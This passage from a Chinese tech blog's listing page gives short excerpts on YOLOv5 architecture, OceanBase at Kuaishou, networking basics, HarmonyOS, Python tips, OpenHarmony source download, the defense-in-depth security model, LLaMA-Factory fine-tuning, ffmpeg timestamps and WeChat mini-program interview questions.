输入端-输入端表示输入的图片。该网络的输入图像大小为608*608，该阶段通常包含一个图像预处理阶段，即将输入图像缩放到网络的输入大小，并进行归一化等操作。在网络训练阶段，YOLOv5使用Mosaic数据增强操作提升模型的训练速度和网络的精度；并提出了一种自适应锚框计算与自适应图片缩放方法。基准网络-基准网络通常是一些性能优异的分类器种的网络，该模块用来提取一些通用的特征表示。YOLOv5中不仅使用了CSPDarknet53结构，而且使用了Focus结构作为基准网络。Neck网络-Neck网络通常位于基准网络和头网络的中间位置，利用它可以进一步提升特征的多样性及鲁棒性。虽然YOLOv5同样用到了SPP模块、FPN+PAN模块，但是实现的细节有些不同。Head输出端-Head用来完成目标检测结果的输出。针对不同的检测算法，输出端的分支个数不尽相同，通常包含一个分类分支和一个回归分支。YOLOv4利用GIOU_Loss来代替Smooth L1 Loss函数，从而进一步提升算法的检测精度。 3 关键代码 ​
class Detect(nn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b35222fe3720b98bc3bc6f1c045fa435/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60550e0088a2c18ba9a90cd75998ae33/" rel="bookmark">
			单集群400TB，OceanBase稳定支撑快手核心业务场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一款日均超过千万人访问的短视频 App 快手，面对高并发流量如何及时有效地处理用户请求？通过在后端配置多套 MySQL 集群来支撑高流量访问，以解决大数据量存储和性能问题，这种传统的 MySQL 分库分表方案有何问题？快手对分布式数据库展开选型并最终大规模落地 OceanBase 的原因是什么？本文来自于快手运维负责人筱虫对此次快手数据库解决方案进行的思考和经验总结。
快手 APP 是中国流行的短视频和直播应用之一，其内容涵盖生活的方方面面，希望以技术赋能，用科技提升每个人独特的幸福感。在快手上，用户可以用照片和短视频记录自己的生活点滴，也可以通过直播与粉丝实时互动。自 2011 年成立至 2021 年上市以来，快手日活用户已达数亿，一方面促使直播、电商等业务飞速增长，另一方面，底层系统也面临着前所未有的压力。虽然，传统方案一定程度上缓解了快手的存储问题，带来了性能上的提升，但同时运维复杂性和不可持续性也为公司的可持续发展带来了挑战。
随着订单业务量及业务数据的迅猛增长，快手原来采用的 MySQL 解决方案在存储和性能方面的表现愈发不足，以订单业务为例，订单业务总数据量超过 150TB 时，MySQL 的存储瓶颈和性能问题越来越明显。为缓解该类问题带来的业务影响，我们选择分库分表方案来应对。
但是，业务持续增长使底层数据库的分片数不断增加，以至于线上 MySQL 分片数达到 300+，不仅没能彻底解决存储问题还引入了更大的运维复杂度，需要我们不断对应用进行改造和适配以解决分库分表带来的问题。而短视频 App 的业务峰值 QPS（每秒查询率）能达到百万以上，对性能要求极高，在此情况下，单个集群需要很多的 MySQL 节点，无法做到在业务高峰期保证业务请求及时返回，并且不论是中间件还是数据下游所有链路，都需要很重的硬件以支撑产品稳定性方案。
此外，我们的 TP 业务要求具备强事务、实时读写的能力，同时伴有 AP 需求，为了保证系统稳定可靠，需要采用 MySQL 接 ClickHouse、Elasticsearc 或 Doris，可能需要更多的数据副本，这就带来了更高的硬件成本。
我们意识到，分库分表方案只能尽可能缓解而无法从根本上解决问题，亟需一款既能满足业务需求，又具备高性能、灵活扩展，还能降低运维复杂度的分布式数据库解决方案。
在分布式数据库的探索之路上，我们最初尝试了某分布式数据库品牌。但在使用过程中发现其在写入性能、运维方式等方面存在问题。比如，运维平台比较简单, 难以满足 DBA 的需求，且很多内核问题难以得到解决。因此，我们尝试选择了 OceanBase。
让我印象比较深的是，单表超过 10TB 且不断增长的情况下，使用该数据库架构做 DDL，预计需要一周，而使用 OceanBase 则不到一天即可完成。并且，由于部分业务持续增长，需要不断加表、加源数据，使得 DDL 操作繁多。该数据库本身是小分区的方式，在数据量大的情况下会导致整个 region 数量变得特别大，一旦出现宕机或扩缩容、节点替换需求时，很可能影响业务稳定性。相应的，OceanBase 采用大分区，像上述的业务操作可以在小时级，最多天级完成。
目前，我们短视频 App 有 8 个 OceanBase 集群，机器规模已经超过 200 台物理机，数据量超 800T，最大集群数据量超 400T。我们最初使用 OceanBase 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60550e0088a2c18ba9a90cd75998ae33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db8b1a0326ccf195862f81546fdcddd9/" rel="bookmark">
			计算机网络简述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 计算机网路是一个很庞大的话题。在此我仅对其基础概述以及简单应用进行陈述。后续或有补充以形成完善的计算机网络知识体系。
一.计算机网络的定义 根据百度词条的描述，计算机网络是指将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路和通信设备连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统。
通俗来说，计算机网络是以实现远程通信和资源共享为目的，大量分散而又互联的计算机的集合。
二.计算机网络的功能 我们需要注意的是，计算机网络并非单个的计算机或者说个别计算机的组成，它实际上是由数台甚至很多台计算机构成的一个网路体系，那么它的功能与作用实际上既包括了计算机个体的作用又包括了其作为一个网络体系的集成化功能，以下介绍的是其作为网络的功能。
1.数据通信 作为计算机网络最基本的功能，数据通信指的就是计算机与计算机之间、计算机与终端、终端与终端之间的各种信息的传输能力，包括我们平常所说的文字信件、新闻信息等等，作为数据被从此端传输到彼端。
2.资源共享 资源指的是网络中的软件、硬件以及种种数据。共享指的是计算机网络中的用户可以共同享有这些资源，并且也可以自己进行上传或者提取来对资源进行操作。
3.分布式处理 当一台计算机的负担过重时，我们就可以调用网络中的其他计算机来分担它的工作，从而达到分布式处理的作用。该功能能够提高问题处理的实时性以及效率。同样的，鉴于分布式处理的好处，计算机的安全性以及可靠性也会得以提高，并且在此基础上还能提高性能，毕竟众人抬火火焰高。
三。计算机网络的组成 计算机网络由网络硬件、网络软件以及协议三部分组成。
1.硬件 网络硬件是计算机网络的物质基础，计算机网络通过硬件实现不同计算机之间的物理连接，同时计算机本身也属于硬件的一类。
硬件大致分为该三类：
(1)可独立工作的计算机 （计算机网络的核心）
A.服务器 服务器向网络用户提供服务，并负责对网络资源进行管理。
像腾讯云，百度云一系列的云服务器是目前主流使用的服务器。实际上，对服务器的理解，我们可以从一个游戏来了解。
MC，我的世界中，许多的玩家即使从未了解过计算机网络的相关知识，也会知道一个东西叫做服务器。在其中不同玩家可以聚集在同一个服务器中进行游玩，他们处于同线程，同时间但是不同地点。其实不同的玩家就对应着不同的计算机，服务器提供游玩的服务以及基本的运营，这就是一个计算机网络中服务器极好的示范。
B.网络工作站 它是一台供用户使用网络的本地计算机。
它与服务器最大的区别就是：服务器可以是集群，但工作站就是一台计算机。它作为独立的计算机为用户服务，同时也可以同其他的工作站进行通信与共享资源。
(2）网络设备 （构成计算机网络的部件）（计算机之间的访问通过网络设备实现）
A.网卡 计算机与传输介质的接口。它具有接受和输送数据包的作用。
B.调制解调器 利用调制解调技术实现数字信号与模拟信号在通信过程中相互转换的设备。
C.中继器 最简单的局域网延伸设备。其作用是放大传输介质上传输的信号。（建议游玩MC中的中继器以便于更好的理解doge）
D.网桥 用于连接使用相同通信协议、传输介质和寻址方式的网络。
E.交换机 F.路由器 G.网关 (3)传输介质 传输介质是网路通信使用的信号线路，实际上我们平常看到的网线就是一种传输介质。它分为无线和有线两种类型。
有线：一般包括双绞线、同轴电缆、光缆...
无线：一般包括无线电、微波、卫星通信...
2.软件 计算机网络中的软件不只是个体所包含的软件，同时包含通信协议等一系列处于网络之中的软件
A.网络操纵系统 用于管理网络软硬件资源，提供简单网络管理功能的系统软件。常见的有Windows、Linux等。
B.网络应用软件 注意这里的软件必须具备网络服务功能。例如浏览器软件，即时通信软件QQ、微信等。
3.网络通信协议 计算机交换信息时需要遵守的约定，规定了互通信息的规则。
四.计算机网络的分类 通常我们对计算机网路进行分类的时候，会从覆盖范围、拓扑结构以及体系结构来进行分类，因为这三者的分类方式是最清晰以及透彻的。
A.按照覆盖范围 按照地域范围分类，是最简单也是最直接的分类方式。
1. 局域网（LAN）：覆盖范围通常在家庭、办公室或学校等小范围内，用于连接个人电脑、打印机、路由器等设备。
2. 城域网（MAN）：覆盖范围通常在城市范围内，用于连接多个局域网，例如连接不同办公楼或校区内的网络。
3. 广域网（WAN）：覆盖范围可以是跨越城市、国家甚至全球范围，用于连接不同地理位置的网络，例如连接不同城市的分公司或连接不同国家的数据中心。Internet是世界上最大的广域网。
4. 互联网（internet）：覆盖范围是全球范围，连接了世界上几乎所有的计算机网络，是全球最大的计算机网络。
5. 无线局域网（WLAN）：基于无线技术，覆盖范围类似于个人局域网，但是不需要通过有线连接，常见于家庭、咖啡店、机场等地方。
6. 蜂窝网络（Cellular）：覆盖范围是移动通信网络，可以覆盖整个国家甚至全球范围，用于连接移动设备如手机、平板电脑等。
B.按照拓扑结构 拓扑结构的分类方式可以直观看出计算机网路各部分的组成以及它们连接的方式的优劣。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db8b1a0326ccf195862f81546fdcddd9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9be578f023c85952b0736cbd9e0e411a/" rel="bookmark">
			【excel密码】Excel工作表不能复制或移动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么excel文件打开之后，工作表里是可以编辑的，但是想要移动工作表或者复制、重命名等操作，这是什么原因？其实这是因为设置了工作簿保护，设置了保护的工作簿无法对整张工作表进行操作。
想要取消这种保护，方法如下：
打开excel工作表，点击工具栏中的审阅 – 保护工作簿
点击保护工作簿之后，会有弹框出现，我们将提示框中的密码删除掉，点击确定就可以了
如果忘记了密码我们可以使用工具帮助我们撤销保护，比如超人Excel解密助手中解除限制功能，导入excel文件之后点击开始就可以撤销保护工作簿。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71561358c1dbaab2ac9a6d5e29b06034/" rel="bookmark">
			鸿蒙的基本入门理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、鸿蒙工具的安装： 1、安装：官网
按照官网的步骤，按照好后，可以直接使用previewer预览就可以了【刚入门，不建议大家搞得太多，容易晕】。
如果预览不了，再安装模拟器
2、新建项目：官网
3、新建页面
二、文件（页面，组件）的基本结构 // @开头的表示为装饰器， //@Entry，表示每个页面的入口组件 @Entry // @Component，表示声明一个组件 @Component // struct，表示定义组件的关键字 struct Demo { //@State修饰的数据是状态（响应式数据） @State message: string = 'Hello World' // 这是UI部分，相当于vue单页面的 &lt;template&gt;部分，或者react类组件的 render方法，react函数式组件的return部分 build() { Row() { Column() { // 在模板里使用状态，用this。跟react的类组件写法一样。 // 在模板里使用状态，直接使用，不需要使用vue或者react的模板语法， // 下面这句话表示，把message状态显示在页面上。是文本。 Text(this.message) .fontSize(50) .fontWeight(FontWeight.Bold) } .width('100%') } .height('100%') } } 三、页面的UI部分 1、ArkTS界面布局 1）、ArkTS 组件基本思路和写法 组件名({参数列表}){ 子组件1({参数列表}){ 孙组件 ………… }.属性和方法 ………… } .属性1 .方法1(参数) .属性2 .方法2(参数) ……………………………… 2）、对应着H5的理解（vue为例） &lt;组件名 属性名1=属性值1 属性名2=属性值2 @事件名="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71561358c1dbaab2ac9a6d5e29b06034/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc760393bb16f3ce5978aa46225364a8/" rel="bookmark">
			python打包py文件成exe文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于python打包py文件成exe文件_pycharm打包exe文件-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/037f2c1f0bd0ff5f2b2c614641e150a9/" rel="bookmark">
			python range用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		range 是 Python 中的一个内置函数，用于生成一个整数序列，通常用在循环中。它有三种常用的用法：
1. 基本用法： range(stop) stop: 生成的整数序列终止的值（不包含在序列中）。 for i in range(5): print(i) 输出：
0 1 2 3 4 2. 指定起始值和终止值： range(start, stop) start: 生成的整数序列的起始值。stop: 生成的整数序列终止的值（不包含在序列中）。 for i in range(2, 8): print(i) 输出：
2 3 4 5 6 7 3. 指定步长： range(start, stop, step) start: 生成的整数序列的起始值。stop: 生成的整数序列终止的值（不包含在序列中）。step: 步长，即序列中相邻两个整数的差值。 for i in range(1, 10, 2): print(i) 输出：
1 3 5 7 9 需要注意的是，range 生成的序列是惰性的，只在需要时才计算下一个值，这使得它在处理大数据集时更加高效。
此外，可以将 range 与 list 结合使用，将其转换为列表：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/037f2c1f0bd0ff5f2b2c614641e150a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/582a7100be257d818bcf6407a24999a7/" rel="bookmark">
			OpenHarmony 4.0 Release源码获取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OpenHarmony 4.0 Release源码获取 方式一（推荐）
通过repo + ssh 下载
从版本分支获取源码。可获取该版本分支的最新源码，包括版本发布后在该分支的合入。
repo init -u git@gitee.com:openharmony/manifest.git -b OpenHarmony-4.0-Release --no-repo-verify repo sync -c repo forall -c 'git lfs pull' 从版本发布Tag节点获取源码。可获取与版本发布时完全一致的源码。
repo init -u git@gitee.com:openharmony/manifest.git -b refs/tags/OpenHarmony-v4.0-Release --no-repo-verify repo sync -c repo forall -c 'git lfs pull' 方式二
通过repo + https 下载。
从版本分支获取源码。可获取该版本分支的最新源码，包括版本发布后在该分支的合入。
repo init -u https://gitee.com/openharmony/manifest -b OpenHarmony-4.0-Release --no-repo-verify repo sync -c repo forall -c 'git lfs pull' 从版本发布Tag节点获取源码。可获取与版本发布时完全一致的源码。
repo init -u https://gitee.com/openharmony/manifest -b refs/tags/OpenHarmony-v4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/582a7100be257d818bcf6407a24999a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70b805ebac7ab8985babdbcbcc0d313e/" rel="bookmark">
			详解视频美颜SDK：算法优化与性能提升
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		众所周知，视频美颜SDK的算法优化和性能提升至关重要。下文小编将与大家深度探讨视频美颜SDK的算法原理，以及近期的性能优化措施。
一、常见用法
视频美颜SDK对人脸进行识别，并附加适当的美颜效果。例如：
1.识别、关键点
2.肤色调整
3.磨皮处理
4.瘦脸大眼
二、性能提升措施
为了在保持高效运行的同时提供更好的美颜效果，视频美颜SDK的性能提升显得尤为重要。以下是一些常见的性能优化措施：
1.硬件加速：最常用的优化手段，这个不用过多讲解。
2.多线程优化：将美颜充分利用多核处理器的优势，提高并行处理能力。
3.模型剪枝：对深度学习模型进行精简，去除冗余参数，降低模型大小，从而减少算法运行时的计算负担。
4.动态调整参数：根据实际场景和用户需求，动态调整算法参数，实现更灵活的美颜效果。
三、未来发展趋势
视频美颜SDK将迎来更多的创新和突破。我们可以畅想一下未来方向：
1.个性化：根据用户提供个性化的美颜效果，满足多样化的用户需求。
2.实时转换：引入风格迁移技术，使用户可以实时切换不同的美颜风格，增加趣味性和个性化。
3.场景识别：结合场景识别技术，根据不同的拍摄环境调整美颜效果，提供更贴合场景的美颜体验。
4.协同处理：减轻移动设备的计算负担，实现更高效的美颜处理。
总体而言，视频美颜SDK在算法原理和性能提升方面的不断创新，将为用户提供更加优质、个性化的美颜体验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/549db1922ee19391a8396b706a54b467/" rel="bookmark">
			13-网络安全框架及模型-纵深防御模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
纵深防御模型
1 背景概述
2 核心思想
3 主要内容
4 模型作用
5 优势和局限性
6 应用场景
纵深防御模型 1 背景概述 纵深防御模型是一种网络安全防御策略，它旨在通过多重的安全措施构建多道防线，提高网络信息系统的安全性和可靠性。该模型起源于军事领域的防御理论，后来被引入到网络安全领域。
在互联网飞速发展的过程中，网络攻击和安全威胁也日益增多和复杂化，传统的单一安全措施已经不能满足网络安全的需求。因此，人们开始探索一种更加综合、更加全面的网络安全防御策略，纵深防御模型应运而生。
纵深防御模型利用多种不同的安全措施，从外围到内部逐层加固，形成了多道防线，使得攻击者需要克服多重障碍才能进入目标系统。同时，如果攻击者突破了某一个防线，其他防线仍然可以起到保护作用，从而保证了整个网络的安全性。
纵深防御模型的主要特点包括：多重屏障、多层次防御、多方位保护、集中管理等。通过该模型，网络管理员可以更好地规划和实施网络安全策略，提高网络信息系统的抵御和恢复能力，以确保网络在面对各种安全威胁时能够持续提供必要的服务。
2 核心思想 纵深防御模型的核心思想是通过构建多层次、多维度的安全防御措施，形成网络安全的“多道防线”，从而提高网络系统对各种安全威胁和攻击的抵御能力。其核心思想主要包括以下几点：
多重屏障：纵深防御模型强调在网络安全设计中设置多重屏障，使得攻击者需要逐一突破每一道防线才能进入目标系统。这种多重屏障的设置增加了攻击的难度，提高了网络的安全性。
多层次防御：纵深防御模型采取了多层次的安全防御措施，涵盖了网络边界防护、内部访问控制、安全监测与实时响应、恢复与应急处理等多个方面。这些层次的防御措施相互配合，形成了全方位的安全防护网。
多方位保护：纵深防御模型注重对网络安全的全方位保护，不仅关注外部网络边界的防护，还包括内部网络的安全防御，以及对各类安全事件的实时监测和迅速响应。这种多方位保护的策略可以有效地应对各种安全威胁。
集中管理：纵深防御模型强调安全策略的集中管理和整体规划，通过统一的安全管理平台对网络安全进行全面管理和监控，确保各个安全措施的协同工作，提高网络安全的整体效能。
总的来说，纵深防御模型的核心思想是通过多层次、多维度的安全防御措施，构建多道防线，从而形成全面、综合的网络安全防御体系，提高网络系统对各种安全威胁和攻击的抵御能力。
3 主要内容 纵深防御模型主要包含以下几个主要内容：
安全保护：安全保护是网络的第一道防线，旨在防止外部攻击者进入网络系统。其中包括了诸如网络边界防护、入侵检测与防御系统（IDS/IPS）、访问控制、数据加密等各种安全措施。安全保护的目标是尽可能地阻止攻击者接触到网络系统。
安全监测：安全监测是网络的第二道防线，用于及时发现网络入侵和破坏行为。安全监测包括入侵检测系统（IDS）、日志分析和审计、网络流量分析等技术手段。通过对网络活动进行实时监控和分析，可以及时发现异常活动并采取相应的措施。
实时响应：实时响应是网络的第三道防线，当攻击发生时，能够迅速响应并采取措施以降低损害。实时响应包括紧急修补漏洞、隔离受感染的系统、清除病毒、关闭漏洞等措施。通过快速应对网络安全事件，可以减少攻击者对网络系统的控制权。
恢复：恢复是网络的第四道防线，用于使网络在遭受攻击后尽快恢复正常运行。恢复包括备份和灾难恢复计划、系统修复和修复、应急响应等措施。通过有效的恢复措施，可以最大限度地降低安全事件带来的损失，并保障网络系统的可用性。
纵深防御模型通过将这四个方面有机结合起来，形成多道保护线，提高了网络信息系统的安全性和可靠性。它强调防御策略的全面性和综合性，使得攻击者需要克服多重障碍才能进入目标系统，从而提高了网络的抵御能力。
4 模型作用 纵深防御模型在网络安全领域具有重要的作用，主要表现在以下几个方面：
增加攻击者的难度：纵深防御模型通过设置多重屏障和多道防线，使得攻击者需要逐一突破每一道防线才能进入目标系统。这种多层次、多维度的安全防御措施大大增加了攻击者获取敏感信息、入侵系统的难度，有效降低了网络攻击的成功率。
提高安全事件的检测和响应能力：纵深防御模型注重对安全事件的多方位监测和实时响应。通过在不同层次设置安全监测设备和系统，能够及时发现异常行为和攻击活动，并采取相应措施进行应对。这有助于快速识别并控制潜在威胁，降低安全事件造成的损失。
保护关键资产和数据：纵深防御模型强调内部网络的安全防御，通过合理的访问控制、身份认证等措施，保护关键资产和敏感数据免受未经授权的访问和窃取。这有助于防止重要数据泄露、知识产权损失等风险发生。
提高系统的可恢复性：纵深防御模型不仅注重攻击的防范，也关注系统的恢复与应急处理。通过备份关键数据、建立灾备机制、制定应急响应计划等措施，可以在安全事件发生后快速恢复系统功能，减少业务中断时间和损失。
综合安全管理：纵深防御模型强调集中管理和整体规划，通过统一的安全管理平台对网络安全进行全面管理和监控。这有助于实现安全策略的协同工作，提高安全措施的整体效能，降低管理成本和风险。
5 优势和局限性 纵深防御模型有以下几个优势：
多层次防御：纵深防御模型采用多重屏障和多道防线的策略，可以在攻击者突破一道防线时，还有其他防线起到保护作用。这种多层次的安全措施能够有效增加攻击者的难度，提高网络系统的安全性。
综合防御策略：纵深防御模型注重整体安全规划和综合防御策略的制定，不仅关注外部入侵的防范，也注重内部威胁的控制。通过综合运用各类安全技术和措施，可以全面提升网络系统的安全性。
增强检测和响应能力：纵深防御模型强调对安全事件的多维度监测和实时响应。通过设置安全监测设备和系统，能够及时发现异常行为和攻击活动，并采取相应措施进行应对。这有助于快速识别并控制潜在威胁，降低安全事件造成的损失。
提高系统的可恢复性：纵深防御模型重视系统的可恢复性和应急处理能力。通过备份关键数据、建立灾备机制、制定应急响应计划等措施，可以在安全事件发生后快速恢复系统功能，减少业务中断时间和损失。
然而，纵深防御模型也存在一些局限性：
成本高昂：纵深防御模型需要在多个层面、多个环节上投入安全设备和技术，因此成本较高。企业或组织需要投入大量资源来购买、部署和维护安全设备，并培训专业人员来操作和管理这些设备。
复杂性与管理难度：纵深防御模型涉及多个安全层面和措施，管理起来相对复杂，需要综合考虑和协调各个环节的安全策略。此外，纵深防御模型也增加了系统配置和管理的复杂性，可能需要更多的人力资源和专业知识来维护和管理。
对性能的影响：纵深防御模型在提升安全性的同时，可能会对系统的性能产生一定影响。例如，安全设备和系统的引入可能会增加网络延迟和数据处理时间，在某些情况下可能影响到系统的正常运行。
综上所述，纵深防御模型具有较多的优势，但也存在一些局限性，需要综合考虑实际情况和需求来选择合适的安全策略和措施。
6 应用场景 纵深防御模型可以应用于多种场景，包括企业内部网络、政府机构网络、金融机构网络等，以保护关键资产和数据的安全。具体应用场景如下：
企业内部网络：企业内部网络是纵深防御模型应用的主要场景。通过在网络边界、内部网络和终端设备上设置多层次、多维度的安全措施，可以有效防范内部员工、外部攻击者和恶意软件等安全威胁，保护企业重要资产和敏感数据的安全。
政府机构网络：政府机构拥有大量的敏感信息和数据，也是网络攻击的高风险目标。通过在政府机构内部网络、互联网边界和终端设备上设置多重屏障和多道防线，可以有效保护政府机构的信息安全，防范各类安全威胁。
金融机构网络：金融机构拥有大量的财务和客户信息，是网络攻击的重点目标。通过采用纵深防御模型，可以构建安全性高、可靠性强的金融网络系统，有效防范银行卡盗刷、网络诈骗、数据泄露等安全威胁。
电信运营商网络：电信运营商拥有大量的用户信息和通信数据，也是网络攻击的高风险目标。通过在电信运营商网络边界、核心网和终端设备上设置多重屏障和多道防线，可以保护电信运营商的通信信息安全，防范各类安全威胁。
云计算网络：云计算网络是纵深防御模型应用的新兴领域。通过在云服务提供商的网络边界、内部网络和客户终端设备上设置多层次、多维度的安全措施，可以保护云计算环境中的数据安全和隐私，防范云计算平台的安全威胁。
总之，纵深防御模型适用于多种场景，可以帮助企业、政府和金融机构等保护重要资产和敏感数据的安全，防范各类网络安全威胁。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebde4e84bcd26c0c148b40be1740110f/" rel="bookmark">
			Python编码错误的解决办法SyntaxError: Non-ASCII character ‘\xe5‘ in file
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在编写Python时，当使用中文输出或注释时运行脚本，会提示错误信息：
SyntaxError: Non-ASCII character '\xe5' in file *******
【原因】
python的默认编码文件是用的ASCII码，而你的python文件中使用了中文等非英语字符。
【解决办法】
在Python源文件的第一行，加入一句：
# -*- coding:UTF-8 -*- 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c10f96103627b7b6f888ad0bda7ef91d/" rel="bookmark">
			使用LLaMA-Factory微调ChatGLM3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、创建虚拟环境 略
2、部署LLaMA-Factory （1）下载LLaMA-Factory https://github.com/hiyouga/LLaMA-Factory
（2）安装依赖 pip3 install -r requirements.txt （3）启动LLaMA-Factory的web页面
CUDA_VISIBLE_DEVICES=0 python src/train_web.py 得到如下页面：
3、ChatGLM3模型微调 设置如下参数，点击开始即可：
点击“预览命令”，可以看到要执行的python脚本，如下所示：
CUDA_VISIBLE_DEVICES=0 python src/train_bash.py \ --stage sft \ --do_train \ --model_name_or_path /root/LLaMA-Factory-main/chatglm3\ --dataset alpaca_gpt4_zh \ --template default \ --finetuning_type lora \ --lora_target q_proj,v_proj \ --output_dir path_to_sft_checkpoint \ --overwrite_cache \ --per_device_train_batch_size 4 \ --gradient_accumulation_steps 4 \ --lr_scheduler_type cosine \ --logging_steps 10 \ --save_steps 1000 \ --learning_rate 5e-5 \ --num_train_epochs 3.0 \ --plot_loss \ --fp16 web页面和后台都会显示日志信息
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c10f96103627b7b6f888ad0bda7ef91d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02367a6abe4613d7187c4a4803370e49/" rel="bookmark">
			ffmpeg 解码文件时的时间戳问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实时流和普通文件 1 实时流
实时流编码时，我们一般不进行b帧编码，但是文件存储时为了减小大小，会增加b帧，实时流只带了I，P帧，那就会好很多
2 普通文件
很多文件带了b帧，所以要使用解码时间去同步，如果使用pts，很多人一定会被其时间搞混。
我们可以正确使用AVFrame 的pts 和pkt-dts 去保存正常的时间，如果不给其正确赋值，那么值就如下所示，是novalue。
那么获取pts和dts 去赋值给avframe就行了，注意时间基。如果不进行时间延时，那么文件会被cpu 快速读完，这就看cpu有多强了，当然，为了仅仅是测试，当然可以直接使用帧率，间隔时间延时就行，如果做播放器就不能这样了，我们要严格掐时间，按照秒表去对。
int main() { c_test test; std::thread t([&amp;test]() { // 在这里编写你的匿名函数的代码 std::cout &lt;&lt; "Hello from the new thread!" &lt;&lt; std::endl; test.func_init("G:/record/A1_.mp4"); test.Start(); }); while (1) { AVFrame* f = test.GetData(); if (f != NULL) { int h = f-&gt;height; int w = f-&gt;width; cv::Mat mat(h, w, CV_8UC3,f-&gt;data[0]); cv::Mat matBGR; cv::cvtColor(mat, matBGR,cv::COLOR_RGB2BGR/* cv::COLOR_BGR2YUV_I420*/); cv::imshow("show", matBGR); std::cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02367a6abe4613d7187c4a4803370e49/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d55190cbce1bbf0e16ff5cff0e1234ed/" rel="bookmark">
			微信小程序面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信小程序面试题 请解释微信小程序的生命周期及其对应的钩子函数。
微信小程序的生命周期包括 onLaunch、onShow、onHide、onError、onPageNotFound 等阶段。对应的钩子函数分别是：
onLaunch：小程序初始化时触发。onShow：小程序启动或从后台进入前台时触发。onHide：小程序从前台进入后台时触发。onError：小程序发生错误时触发。onPageNotFound：页面不存在时触发。 请解释微信小程序的页面生命周期及其对应的钩子函数。
微信小程序的页面生命周期包括 onLoad、onShow、onReady、onHide、onUnload 等阶段。对应的钩子函数分别是：
onLoad：页面加载时触发。onShow：页面显示时触发。onReady：页面初次渲染完成时触发。onHide：页面隐藏时触发。onUnload：页面卸载时触发。 请解释什么是组件化开发，并举例说明微信小程序中的组件化开发。
组件化开发是一种将页面拆分为独立、可复用的组件进行开发的方法。在微信小程序中，可以通过自定义组件实现组件化开发。例如，将一个按钮封装成一个独立的按钮组件，然后在多个页面中复用这个按钮组件。
请解释什么是事件冒泡和事件捕获，并说明微信小程序中的事件传播机制。
事件冒泡和事件捕获是指事件在 DOM 树中传播的两种方式。在微信小程序中，事件传播机制是先捕获后冒泡。即事件从最外层的节点向内层节点进行捕获，然后再从内层节点向外层节点进行冒泡。
请解释微信小程序中的数据绑定和双向绑定的概念。
数据绑定是指将数据与视图进行关联，当数据发生变化时，视图也会相应地更新。双向绑定是数据绑定的一种扩展，不仅可以将数据反映到视图上，还可以将用户的输入反映回数据中。
请解释微信小程序中的全局变量和页面变量的区别。
全局变量是指在整个小程序中都可以访问的变量，它可以在不同的页面之间共享。页面变量是指在特定页面中定义的变量，它只能在该页面中访问。
请解释微信小程序中的 WXML 和 WXSS 的作用。
WXML 是微信小程序的模板语言，用于描述页面的结构。它类似于 HTML，但具有一些微信小程序特定的语法和标签，如 wx:if、wx:for 等。WXSS 是微信小程序的样式语言，用于描述页面的样式。它类似于 CSS，但也有一些微信小程序特定的样式规则和单位，如 rpx。
请解释微信小程序中的路由和页面跳转方式。
路由是指在不同页面之间进行切换的方式。微信小程序中的页面跳转方式包括 navigateTo、redirectTo、switchTab、navigateBack 等。其中，navigateTo 和 redirectTo 可以用于页面的正常跳转，switchTab 用于跳转到底部的 Tab 页面，navigateBack 用于返回上一页面。
请解释微信小程序中的页面栈和页面栈的大小限制。
